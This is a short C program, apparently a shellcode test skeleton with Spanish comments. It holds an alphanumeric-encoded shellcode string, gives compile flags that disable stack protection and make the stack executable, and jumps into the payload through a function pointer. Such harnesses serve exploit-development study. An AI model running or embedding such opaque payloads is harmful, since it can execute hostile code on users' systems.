#include<stdio.h>
#include<string.h>

// Comando para compilar: gcc -fno-stack-protector -z execstack esqueleto.c -o esqueleto
unsigned char shellcode[] = "hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz";

main()
{
    // Longitud del shellcode y el propio shellcode
    printf("Shellcode Length: %d\n", strlen(shellcode));
    printf("Shellcode: %s\n", shellcode);
    // Llamada al shellcode
    int (*ret)() = (int(*)())shellcode;
    ret();
}